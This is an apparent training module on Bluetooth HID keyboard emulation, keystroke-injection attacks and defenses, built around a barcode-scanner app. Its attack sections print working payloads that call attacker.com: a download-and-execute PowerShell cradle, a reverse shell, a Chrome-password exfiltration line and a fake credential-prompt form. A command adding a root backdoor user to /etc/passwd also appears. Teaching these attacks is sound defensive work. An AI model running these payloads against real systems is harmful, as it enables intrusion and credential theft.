# Bluetooth HID Protocol

## Overview

Human Interface Device (HID) over Bluetooth is a profile that enables devices like keyboards, mice, and game controllers to communicate with computers wirelessly. Understanding HID is crucial for security professionals because it represents a powerful attack vector—a malicious HID device can inject keystrokes, bypass security controls, and execute commands with the privileges of the logged-in user.

## Table of Contents

1. [What is Bluetooth HID?](#what-is-bluetooth-hid)
2. [HID Protocol Architecture](#hid-protocol-architecture)
3. [How HID Barcode Scanner Uses HID](#how-hid-barcode-scanner-uses-hid)
4. [HID Security Implications](#hid-security-implications)
5. [HID Injection Attacks](#hid-injection-attacks)
6. [RFCOMM Alternative](#rfcomm-alternative)
7. [Defense Mechanisms](#defense-mechanisms)

## What is Bluetooth HID?

Bluetooth HID Profile allows input devices to connect to hosts (computers, tablets, smartphones) without cables. The profile defines how devices:
- Establish connections
- Send input data (keystrokes, mouse movements, button presses)
- Receive output data (LED states, force feedback)

### Key Characteristics

- **Low Latency**: Critical for responsive input
- **Standardized**: Works across all operating systems
- **No Drivers Required**: OS has built-in HID support
- **Trusted by Default**: OS trusts HID input implicitly

**Security Implication**: This "trust by default" is why HID attacks are so effective!

## HID Protocol Architecture

### Protocol Stack

```
┌────────────────────────────────────┐
│      Application/OS Layer          │  ← Interprets keystrokes
├────────────────────────────────────┤
│       HID Report Descriptors       │  ← Defines device capabilities
├────────────────────────────────────┤
│     HID Protocol (HIDP)            │  ← HID-specific messages
├────────────────────────────────────┤
│          L2CAP Channels            │  ← Control (0x0011) & Interrupt (0x0013)
├────────────────────────────────────┤
│      Bluetooth Controller          │
└────────────────────────────────────┘
```

### HID Report Structure

HID devices communicate via **reports**—structured data packets describing input/output:

#### Keyboard Input Report (8 bytes)

```
Byte 0: Modifier keys
  Bit 0: Left Control
  Bit 1: Left Shift
  Bit 2: Left Alt
  Bit 3: Left GUI (Windows/Command)
  Bit 4: Right Control
  Bit 5: Right Shift
  Bit 6: Right Alt
  Bit 7: Right GUI

Byte 1: Reserved (usually 0x00)

Bytes 2-7: Up to 6 simultaneous key presses (HID usage codes)
```

**Example**: Pressing Ctrl+Shift+A
```
[0x05, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00]
 └─┬─┘        └─┬─┘
   │           └─ 0x04 = 'A' key
   └─ 0x05 = Left Control (0x01) + Left Shift (0x04)
```

### HID Usage Codes

HID uses standardized **usage codes** defined by USB HID specification:

| Key | HID Code | Key | HID Code |
|-----|----------|-----|----------|
| A | 0x04 | 1 | 0x1E |
| B | 0x05 | 2 | 0x1F |
| C | 0x06 | Enter | 0x28 |
| D | 0x07 | Escape | 0x29 |
| ... | ... | Tab | 0x2B |
| Z | 0x1D | Space | 0x2C |

**Important**: HID sends **key codes**, not characters. The OS interprets these based on the active keyboard layout.

## How HID Barcode Scanner Uses HID

The HID Barcode Scanner app leverages Android's Bluetooth HID API (Android 9+) to emulate a keyboard.

### Architecture

```
┌─────────────────────────────────────────────┐
│   HID Barcode Scanner App                   │
│                                             │
│  ┌─────────────┐    ┌──────────────────┐  │
│  │ Barcode     │    │  Key Translator   │  │
│  │ Scanner     │───▶│  (Layout Aware)   │  │
│  │ (ZXing)     │    │                   │  │
│  └─────────────┘    └──────────┬───────┘  │
│                                 │           │
│                     ┌───────────▼────────┐ │
│                     │  Keyboard Sender   │ │
│                     │  (HID Reports)     │ │
│                     └───────────┬────────┘ │
└─────────────────────────────────┼──────────┘
                                  │
                                  ▼
                    ┌──────────────────────┐
                    │ Android Bluetooth    │
                    │ HID Device Profile   │
                    └──────────┬───────────┘
                               │
                               ▼
                        ┌─────────────┐
                        │  Computer   │
                        │  (Host)     │
                        └─────────────┘
```

### Key Components

#### 1. BluetoothController.kt

Manages Bluetooth HID device registration:

```kotlin
// Register as HID device
val hidDevice = bluetoothAdapter.getProfileProxy(
    context, 
    serviceListener, 
    BluetoothProfile.HID_DEVICE
)
```

#### 2. KeyTranslator.kt

Converts scanned text to HID codes based on keyboard layout:

```kotlin
// Example: Convert 'A' to HID code based on layout
fun charToHidCode(char: Char, layout: KeyboardLayout): HidKey {
    // Layout-specific mapping
    // US layout: 'A' = Shift + 0x04
    // Returns: HidKey(code=0x04, modifier=SHIFT)
}
```

**Security Note**: Layout awareness is crucial. Mismatched layouts can lead to incorrect input or reveal reconnaissance information.

#### 3. KeyboardSender.kt

Sends HID reports to the connected host:

```kotlin
fun sendKeys(text: String) {
    text.forEach { char ->
        val hidKey = keyTranslator.translate(char, layout)
        sendReport(hidKey.toByteArray())
        sendReport(RELEASE_REPORT) // Key release
    }
}
```

### Registration Process

1. **SDP Record**: App registers HID service with Service Discovery Protocol
2. **HID Descriptor**: Declares device as keyboard
3. **Connection**: Host initiates connection or accepts incoming
4. **Authentication**: Pairing if not previously bonded
5. **Data Transfer**: App can now send keyboard input

## HID Security Implications

### Why HID is Powerful for Attackers

1. **Trusted Input Source**: OS treats HID devices as legitimate user input
2. **No Warnings**: Unlike USB, Bluetooth HID connections may not trigger security warnings
3. **Full User Privileges**: Commands execute with logged-in user's permissions
4. **Rapid Execution**: Can type faster than humans (millisecond latency)
5. **Platform Independent**: Works on Windows, Linux, macOS, Android, iOS

### Attack Capabilities

#### What an Attacker Can Do:

- **Execute Commands**: Open terminals/PowerShell and run commands
- **Exfiltrate Data**: Copy files to cloud storage or external servers
- **Install Malware**: Download and execute payloads
- **Credential Harvesting**: Launch fake login prompts
- **Privilege Escalation**: Exploit OS vulnerabilities via keyboard shortcuts
- **Disable Security**: Turn off antivirus, firewalls
- **Social Engineering**: Display fake system messages
- **Persistence**: Create backdoors for future access

#### Real-World Attack Example:

```
1. Connect to victim's unlocked computer
2. Open Run dialog (Win+R)
3. Type: powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
4. Press Enter
5. Payload executes in background
```

**Execution Time**: < 2 seconds

## HID Injection Attacks

### Attack Vectors

#### 1. Unauthorized Pairing

**Scenario**: Attacker pairs malicious HID device with victim's computer.

**Method**:
- Social engineering (leaving device near victim)
- Exploiting "Just Works" pairing
- Pairing with unlocked, unattended computer

**Mitigation**:
- Require user confirmation for all pairings
- Disable Bluetooth when not needed
- Use PIN-based pairing

#### 2. Impersonation

**Scenario**: Attacker impersonates legitimate HID device.

**Method**:
- Clone MAC address of trusted device
- Replay pairing keys (if obtained)
- Exploit weak bonding storage

**Mitigation**:
- Use device authentication
- Monitor for duplicate MAC addresses
- Secure key storage with hardware backing

#### 3. Command Injection

**Scenario**: Attacker sends malicious keystrokes via HID.

**Method**:
- Direct keystroke injection
- Rubber Ducky-style attacks
- Automated exploitation scripts

**Example Payloads**:

```bash
# Windows: Reverse shell
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('attacker.com',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# Linux: Add backdoor user
echo "backdoor:x:0:0::/root:/bin/bash" | sudo tee -a /etc/passwd

# macOS: Exfiltrate browser passwords
security find-generic-password -wa "Chrome" | curl -F "data=@-" http://attacker.com/receive
```

**Mitigation**:
- Application whitelisting
- User Account Control (UAC)
- Command-line auditing
- Behavioral analysis

#### 4. Credential Capture

**Scenario**: Fake login prompts to harvest credentials.

**Method**:
1. Lock the screen (Win+L)
2. Display fake login dialog
3. Capture entered credentials
4. Send to attacker
5. Unlock and re-login with captured credentials (to avoid suspicion)

**Windows Example**:

```powershell
Add-Type -AssemblyName System.Windows.Forms
$form = New-Object System.Windows.Forms.Form
$form.Text = "Windows Security"
$form.Size = New-Object System.Drawing.Size(400,200)
$form.StartPosition = "CenterScreen"
$form.TopMost = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = "Your session has expired. Please enter your password:"
$label.Location = New-Object System.Drawing.Point(10,20)
$label.Size = New-Object System.Drawing.Size(380,40)
$form.Controls.Add($label)

$textbox = New-Object System.Windows.Forms.TextBox
$textbox.Location = New-Object System.Drawing.Point(10,70)
$textbox.Size = New-Object System.Drawing.Size(360,20)
$textbox.PasswordChar = '*'
$form.Controls.Add($textbox)

$button = New-Object System.Windows.Forms.Button
$button.Text = "OK"
$button.Location = New-Object System.Drawing.Point(150,110)
$button.Add_Click({
    $password = $textbox.Text
    # Send to attacker
    Invoke-WebRequest -Uri "http://attacker.com/creds" -Method POST -Body @{pass=$password}
    $form.Close()
})
$form.Controls.Add($button)

$form.ShowDialog()
```

## RFCOMM Alternative

The HID Barcode Scanner app also supports RFCOMM (Serial Port Profile), which offers different security characteristics.

### RFCOMM vs HID

| Aspect | HID | RFCOMM |
|--------|-----|--------|
| **Protocol** | Bluetooth HID Profile | Serial Port Profile (SPP) |
| **Input Method** | Emulates keyboard | Serial data stream |
| **OS Integration** | Automatic | Requires application |
| **User Impact** | Intrusive (types on screen) | Background operation |
| **Detection** | Visible to user | Silent |
| **Security Model** | Trusted by default | Application-dependent |

### RFCOMM Security Implications

**Advantages for Defense**:
- Requires specific application to receive data
- Not trusted by default like HID
- Easier to implement authorization checks
- Less likely to execute unintended commands

**Advantages for Attackers**:
- Less visible to users
- Bypasses some HID-focused defenses
- Can implement custom protocols
- May evade detection systems

### When to Use RFCOMM (from security perspective)

**For Legitimate Use**:
- Applications requiring background data transfer
- Systems with proper authentication
- Controlled environments
- Multi-factor authentication systems (like secure SMS proxy)

**For Red Team/Pentesting**:
- Testing application-level authorization
- Bypassing HID monitoring tools
- Demonstrating non-HID attack vectors
- Integrating with custom C2 frameworks

## Defense Mechanisms

### Technical Controls

#### 1. Bluetooth Security Policies

```
- Disable Bluetooth when not needed
- Require PIN-based pairing
- Whitelist approved devices
- Regularly audit paired devices
- Use enterprise Bluetooth management
```

#### 2. HID Input Monitoring

**Tools**:
- **Windows**: Event ID 4624 (logon), 4672 (special privileges)
- **Linux**: `evtest`, audit logs
- **Third-party**: HID Guardian, USBGuard (can also monitor Bluetooth)

**Detection Signatures**:
- Rapid keystroke sequences (faster than human typing)
- Execution of PowerShell/cmd with hidden windows
- Suspicious keyboard combinations (Alt+F4, Win+R, etc.)
- New HID device connections

#### 3. Application Whitelisting

Prevent unauthorized executables:
- Windows: AppLocker, Windows Defender Application Control
- macOS: Gatekeeper
- Linux: SELinux, AppArmor

#### 4. Endpoint Detection and Response (EDR)

Modern EDR solutions can detect:
- Suspicious command-line activity
- Unusual process creation patterns
- Credential dumping attempts
- Network connections from unexpected processes

### Administrative Controls

1. **Security Awareness Training**: Educate users about HID attacks
2. **Physical Security**: Lock screens when leaving computers
3. **Access Control**: Limit who can pair Bluetooth devices
4. **Incident Response**: Procedures for suspected HID attacks
5. **Regular Audits**: Review paired Bluetooth devices

### Testing HID Defenses

Use HID Barcode Scanner ethically to test:

1. **Pairing Controls**: Can unauthorized devices pair?
2. **Detection Capabilities**: Do security tools alert on HID injection?
3. **User Awareness**: Do users notice malicious keystroke injection?
4. **Technical Controls**: Can attacks bypass AppLocker, EDR, etc.?

**Exercise**: Set up a test environment and attempt HID injection while monitoring logs. Document what gets detected and what doesn't.

## Practical Lab: HID Analysis

### Objective
Understand how HID communication works by analyzing HID reports.

### Tools Needed
- HID Barcode Scanner app
- Computer with Bluetooth
- Wireshark with BTHCI plugin
- Android Debug Bridge (ADB)

### Steps

1. **Enable HCI Logging** (Android):
   ```bash
   adb shell settings put secure bluetooth_hci_log 1
   ```

2. **Connect HID Scanner** to computer

3. **Send Test Input**: Scan barcode "HELLO"

4. **Capture HCI Log**:
   ```bash
   adb pull /sdcard/Android/data/btsnoop_hci.log
   ```

5. **Analyze in Wireshark**:
   - Open btsnoop_hci.log
   - Filter: `bthid`
   - Examine HID reports

6. **Identify**:
   - Report structure
   - HID codes for H, E, L, O
   - Timing between keystrokes
   - Modifier usage for uppercase

### Expected Observations

- Each character generates two reports: key press and key release
- Uppercase letters use Shift modifier (0x02)
- Reports are sent with minimal latency
- Release report is all zeros

## Quiz

1. What is the primary security risk of HID devices being "trusted by default"?
2. Describe the structure of an 8-byte HID keyboard report.
3. Why must the HID Barcode Scanner app know the host's keyboard layout?
4. Name three defensive controls against HID injection attacks.
5. How does RFCOMM differ from HID in terms of security implications?
6. What are the two L2CAP channels used by Bluetooth HID?
7. How quickly can an HID injection attack execute?
8. What is "keystroke injection" and why is it effective?

## Next Steps

Continue to [BLE Attack Vectors →](03-ble-attack-vectors.md) to explore comprehensive attack methodologies.

## Additional Resources

- [USB HID Usage Tables](https://usb.org/sites/default/files/hut1_3_0.pdf)
- [Bluetooth HID Profile Specification](https://www.bluetooth.com/specifications/specs/hid-profile-1-1/)
- [Android Bluetooth HID Device API](https://developer.android.com/reference/android/bluetooth/BluetoothHidDevice)
- Research: "BadBluetooth: Breaking Android Security Mechanisms via Malicious Bluetooth Peripherals"

---

[← Back: BLE Security Introduction](01-ble-security-introduction.md) | [Next: BLE Attack Vectors →](03-ble-attack-vectors.md)
